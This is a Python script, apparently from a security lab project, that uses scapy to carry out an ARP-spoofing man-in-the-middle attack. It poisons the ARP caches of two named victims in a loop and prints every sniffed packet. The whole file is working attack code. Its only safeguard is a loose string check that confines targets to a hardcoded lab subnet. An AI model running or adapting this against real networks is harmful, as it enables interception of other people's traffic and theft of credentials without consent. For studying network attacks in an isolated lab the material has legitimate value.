from scapy.all import *
from threading import Thread
import scapy.contrib.enipTCP
import sys

SUBNET = '172.28.1.0/24' # Hardcoded to not accidentially mess with outside networks

if len(sys.argv) != 3:
    print('Too few arguments! Usage: python mitm.py victim1 victim2')
    sys.exit()

victim1 = sys.argv[1]
victim2 = sys.argv[2]

if SUBNET[0:9] != victim1[0:9]:
    print(f'Victim 1 {victim1[0:9]} is not in correct subnet {SUBNET}')
    sys.exit()
if SUBNET[0:9] != victim2[0:9]:
    print(f'Victim 2 {victim2} is not in correct subnet {SUBNET}')
    sys.exit()

print('Getting proper interface', flush=True)
iface = conf.route.route(victim1)[0]

def get_mac_address(ip: str) -> str:
    """Broadcast a packet to all devices on the network to get the mac address corresponding to the ip address"""
    """Taken from our AGOTK library"""
    arp_packet: Packet = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(op = 1, pdst = ip)
    srp_packet = srp(arp_packet, timeout=5, verbose=False, iface=iface)
    if len(srp_packet[0]) > 0:
        response: str = srp_packet[0][0][1].hwsrc
        return response
    else:
        print('error broadcasting packet')
        return None

def get_spoof_packet(ip_target: str, mac_target: str, ip_spoof: str) -> Packet:
    """Creates a reply ARP packet"""
    """Taken from our AGOTK library"""
    # create packet, opcode = 2 since it needs to be a reply packet
    # pdst = ip address where the packet needs to go
    # hwdst = destination hardware address
    # pssrc = source ip address (let the receiver think that it is coming from this ip address)
    packet: Packet = ARP(op = 2, pdst = ip_target, hwdst = mac_target, psrc = ip_spoof)
    return packet

def spoof(seconds_to_wait: int = 1) -> None:
    """Spoof the target so that it thinks that this computer is the gateway, and spoof the gateway
    so that it thinks that this computer is the target"""
    print('Getting Mac Addresses...', flush=True)
    # get the mac addresses of the target and the gateway
    mac_victim1 = get_mac_address(victim1)
    mac_victim2 = get_mac_address(victim2)
    print(f'Succeeded: {mac_victim1} {mac_victim2}', flush=True)

    # create the ARP packets to spoof
    packet_for_victim1: Packet = get_spoof_packet(victim1, mac_victim1, victim2)
    packet_for_victim2: Packet = get_spoof_packet(victim2, mac_victim2, victim1)

    print('Start sending spoofing packets...', flush=True)
    while True:
        send(packet_for_victim1, verbose = False)
        send(packet_for_victim2, verbose = False)
        # wait for some seconds
        time.sleep(seconds_to_wait)

spoof_thread = Thread(target=spoof, args=(3, ))
spoof_thread.start()
print('Starting listening...', flush=True)
while True:
    sniff(iface=iface, prn = lambda x: x.show())
